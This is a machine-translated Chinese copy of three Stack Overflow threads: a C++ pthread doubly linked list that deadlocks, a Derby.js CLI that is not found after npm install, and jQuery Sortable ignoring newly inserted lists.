(gdb) bt
#0  0x00007fff8e715122 in __psynch_mutexwait ()
#1  0x00007fff8edc5dfd in pthread_mutex_lock ()
#2  0x00000001000011a8 in ConcurrentDoublyLinkedList<int>::consumeNode (this=0x1001000e0) at ConcurrentDList.h:142
#3  0x0000000100000bd4 in consumeValues (ctx=0x7fff5fbffa78) at ConcurrentDList.cpp:29
#4  0x00007fff8edc07a2 in _pthread_start ()
#5  0x00007fff8edad1e1 in thread_start ()
(gdb) f 2
#2  0x00000001000011a8 in ConcurrentDoublyLinkedList<int>::consumeNode (this=0x1001000e0) at ConcurrentDList.h:142
142             pthread_mutex_lock(&head_->mutex);
(gdb) info reg
rax            0x200012d    33554733
rbx            0x100281000  4297592832
rcx            0x100280da8  4297592232
rdx            0x100    256
rsi            0x403    1027
rdi            0x1001039f0  4296030704
rbp            0x100280ed0  0x100280ed0
rsp            0x100280e00  0x100280e00
r8             0x2060   8288
r9             0x100280720  4297590560
r10            0xf9d79  1023353
r11            0x206    518
r12            0x1303   4867
r13            0x0  0
r14            0x7fff5fbffa78   140734799805048
r15            0x100000bb0  4294970288
rip            0x1000011a8  0x1000011a8 <ConcurrentDoublyLinkedList<int>::consumeNode()+110>
eflags         0x206    518
cs             0x7  7
ss             0x0  0
ds             0x0  0
es             0x0  0
fs             0x0  0
gs             0x0  0
(gdb) p *(pthread_mutex_t*) 0x1001039f0
$34 = {
  __sig = 1297437784, 
  __opaque = "\000\000\000\000` \000\000\000\000\000\000\000\000\000\000\003\004\000\000\000\002\000\000{?\017\000\000\000\000\000\b:\020\000\001\000\000\000\f:\020\000\001\000\000\000\000\000\000\000\000\000\000"
} 
```

不幸的是我不能昆虫 pthread_mutex_t 因为它是一种不透明的类型。（尽管我在 GDB 中打开了不透明类型？）。否则，最好看看该互斥锁的所有者当前是谁。

下面给出了我列表的代码 - 它被过度注释，以解释我对实现的想法。请注意，这到目前为止还不是一个好的或高性能的实现 - 它主要用于说明目的。

CPP代码：

```
#include <stdlib.h>
#include <iostream>

#include <pthread.h>

template <class T>
class Node
{
    private:
       T value_;

       Node<T> *next_;
       Node<T> *prev_;

    public:

        pthread_mutex_t mutex;

        Node(T value, Node<T>* next, Node<T>* prev)
        {
            value_ = value;

            next_ = next;
            prev_ = prev;

            pthread_mutex_init(&mutex, NULL);
        }

        ~Node()
        {
            pthread_mutex_destroy(&mutex);
        }

        void setNext(Node<T>* next)
        {
            next_ = next;
        }        

        void setPrevious(Node<T>* prev)
        {
            prev_ = prev;
        }

        Node<T>* getNext()
        {
            return next_;
        } 

        Node<T>* getPrevious()
        {
            return prev_;
        }

        virtual bool isSentinel()
        {
            return false;
        } 
};

template <class T>
class SentinelNode : public Node<T>
{
    public:
      SentinelNode(T val, Node<T>* next, Node<T>* prev)
          : Node<T>(val, next, prev)
      {
      }

      virtual bool isSentinel()
      {
          return true;
      }
};

template <class T>
class ConcurrentDoublyLinkedList
{
    private:
        Node<T> *head_;
        Node<T> *tail_;

    public: 
        ConcurrentDoublyLinkedList()
        {
            head_ = tail_ = new SentinelNode<T>(NULL, NULL, NULL);
        }

        void produceNode(Node<T>* n)
        {  
            pthread_mutex_lock(&tail_->mutex);

            Node<T>* old = tail_;

            if(head_->isSentinel())
            {
                head_ = tail_ = n;
                pthread_mutex_unlock(&old->mutex);

                delete old;
                old = NULL;
            }
            else
            {
                n->setNext(tail_);
                tail_->setPrevious(n);
                tail_ = n;

                pthread_mutex_unlock(&old->mutex);
            }
        }

        Node<T>* consumeNode()
        {
            pthread_mutex_lock(&head_->mutex);

            if(head_->isSentinel())
            {
                 /* the head can only be a Sentinel if there is
                  * no element within the list
                  */

                  /* this also means that the list is currently
                   * implicitly fully locked */

                  /* return NULL and let the thread decide what to do */

                  pthread_mutex_unlock(&head_->mutex);

                  return NULL;
            }
            else
            {
                /* the head is not a Sentinel, which implies on of the following:
                 *     - The list has exactly one element, which means:
                 *         => head_ == tail_ && !head_->isSentinel()
                 *     
                 *     OR
                 *     
                 *     - The list has at least two elements, which means:
                 *         => head_ != tail_ && !head_->isSentinel()
                 *
                 *     - The absence of a Sentinel guarantees that the list
                 *       is NOT empty
                 */

                 if(head_ == tail_)
                 {
                      /* single element within the list 
                       * the list is still fully locked, 
                       * implicit because head_ == tail_
                       */

                       /* we replace the only element
                        * with a Sentinel, because
                        * the list is empty afterwards
                        */

                        Node<T>* p = head_;
                        head_ = tail_ = new SentinelNode<T>(NULL, NULL, NULL);

                        pthread_mutex_unlock(&p->mutex);

                        return p;
                 }
                 else
                 {
                      /* at least two elements are in the list
                       * which means that the current head
                       * must have a valid predecessor 
                       */

                       /* Producer and Consumer could
                        * hold a lock on two adjacent
                        * nodes. Thus, the Consumer
                        * must acquire head->prev
                        */

                        Node<T>* p = head_;
                        Node<T>* n = head_->getPrevious();

                        pthread_mutex_lock(&n->mutex);

                        /* head_->prev can now not be owned 
                         * by a producer. 
                         */

                        head_ = n;
                        head_->setNext(NULL);

                        pthread_mutex_unlock(&p->mutex);
                        pthread_mutex_unlock(&n->mutex);

                        return p;
                 } 
            }
        }
}; 
```

我真的很感激你对这些东西的想法和想法。我现在正在研究它一段时间，也可能完全走错了路。帮助表示赞赏..

谢谢，塞巴斯蒂安

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T13:25:49.087

假设节点之后仍然是头和尾，消费和生产都锁定了头和尾节点。也就是说，线程可能具有不再是头节点或尾节点的锁定节点。如果您在锁定之前存储了一个“旧”指针，您至少会知道您锁定了哪个节点，但是锁定的节点可能已经被消耗，并且您的某些逻辑可能不再成立。

我认为锁定头和尾指针会更容易，而不是实际节点，假设您只需要生产和消费方法。当然，最简单的解决方案是锁定整个数据结构。

# node.js - Derby.js - npm install derby 成功，但未找到 derby 命令

> ID：15845991
> 
> 赞同：3
> 
> 时间：2013-04-06T01:20:49.933
> 
> 标签：node.js, npm, derbyjs

我正在关注[Derby.js 入门指南](http://derbyjs.com/#getting_started)。我跑了

```
$ npm install -g derby 
```

一切都成功了，但是当我进入

```
$ derby new app-name 
```

我得到：

```
-bash: derby: command not found 
```

我在 Mac OS 10.8、Node v0.10.3、npm v1.2.17 上

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-05-26T19:03:31.940

到目前为止，Derby 的命令行界面部分是vaporware。中没有`bin`设置`package.json`，这是指示`npm`制作可执行脚本的内容。

我怀疑文档领先于源代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-23T11:50:21.457

截至 2014 年 6 月，文档仍然适用于 Derby 0.5，而 0.6 在 npm 中。显然，[generator-derby](https://github.com/derbyparty/generator-derby)目前是启动 0.6 项目的推荐方式：

```
npm install -g yo
npm install -g generator-derby
mkdir myapp
cd myapp
yo derby 
```

确保安装并启动 MongoDB，然后`npm start`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-06T10:56:23.090

检查 NODE_PATH 和 PATH 变量是否包含可执行文件的位置

> 导出 NODE_PATH="/usr/local/lib/node"
> 
> export PATH="/usr/local/bin:/usr/local/sbin:/usr/local/mysql/bin:/usr/local/share/npm/bin:$PATH"

请参阅此[页面](http://shapeshed.com/setting-up-nodejs-and-npm-on-mac-osx/)。

# javascript - Sortable 无法识别插入的元素

> ID：15845997
> 
> 赞同：0
> 
> 时间：2013-04-06T01:21:48.743
> 
> 标签：javascript, jquery

我有以下结构的两级深度可排序（jQuery）列表。ul 元素和 li 元素都是可排序的。

```
<div id="container">    
    <ul id="x_one">
        <li class="y_one"></li>
        <li class="y_two"></li>
        <li class="y_three"></li>
    </ul>
    <ul id="x_two">
        <li class="y_four"></li>
        <li class="y_five"></li>
        <li class="y_six"></li>
    </ul>
</div> 
```

当我动态插入（前置）一个额外的 ul 元素时，如下所示：

```
<div id="container">    
    <ul id="x_three">

    </ul>
    <ul id="x_one">
        <li class="y_one"></li>
        <li class="y_two"></li>
        <li class="y_three"></li>
    </ul>
    <ul id="x_two">
        <li class="y_four"></li>
        <li class="y_five"></li>
        <li class="y_six"></li>
    </ul>
</div> 
```

在刷新页面之前，我无法将 li 元素拖到 ul#x_three 上。

jQuery 的 Sortable 如何识别这些插入的元素？

jQuery代码：

```
$('#container').sortable({    
  update: function() {
   $.post($(this).data('update-url'), $(this).sortable('serialize'));
  }
}); 
```

[http://jsfiddle.net/mvhB4/2/](http://jsfiddle.net/mvhB4/2/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T01:40:47.033

当您自己将项目添加到可排序对象时（而不是通过在可排序对象中拖放），它们没有操作所需的附加事件代码。您可以通过调用`'refresh'`容器来解决此问题：

```
$('#container').sortable('refresh'); 
```

[Sortable Widget 中用于刷新](http://api.jqueryui.com/sortable/#method-refresh)的 jQuery UI 文档说：

> 刷新（）
> 
> 刷新可排序的项目。触发所有可排序项目的重新加载，从而识别新项目。
> 
> 此方法不接受任何参数。

**更新**

很抱歉，我在您进行的两级排序之前错过了（我承认我之前实际上没有使用过 sortables）。小提琴非常有帮助——我建议为每个 Javascript 问题创建一个！

问题是，由于您不仅要`<ul>`对 #container 中的元素进行排序`<div>`，而且还要对`<li>`它们下面的元素进行排序 - 并使用`connectWith`它们使它们跨列表可移动 - 当您添加 new`<ul>`时，需要将其设为可排序并且不是（而且它也不是`connectWith`组的一部分）。所以它就像重新执行初始化代码一样简单：

```
$('.list_type').sortable({
     connectWith: '.list_type'
}); 
```

你完成了。[它有效（JsFiddle）](http://jsfiddle.net/mvhB4/3/)。